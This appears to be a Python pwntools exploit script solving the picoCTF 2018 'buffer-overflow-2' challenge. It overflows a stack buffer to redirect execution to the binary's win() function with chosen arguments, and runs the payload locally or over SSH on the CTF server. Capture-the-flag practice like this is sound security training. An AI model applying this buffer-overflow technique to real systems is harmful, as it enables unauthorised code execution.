#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

# Payload settings
vuln = ELF('./vuln')
deadbeef = p32(0xDEADBEEF)
deadcode = p32(0xDEADC0DE)
winaddr = p32(vuln.symbols['win'])
padding = 'A' *112
payload = padding + winaddr + asm('nop') * 4 + deadbeef + deadcode

# Run local
def local():
	io = vuln.process()
	io.sendline(payload)
	print(io.recvall())

def remote():
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/buffer-overflow-2_1_63b4b691601811c553a7c19e367737b9; ./vuln')
	print(io.recv())
	io.sendline(payload)
	print(io.recv())
	s.close()

if __name__ == '__main__':
	remote()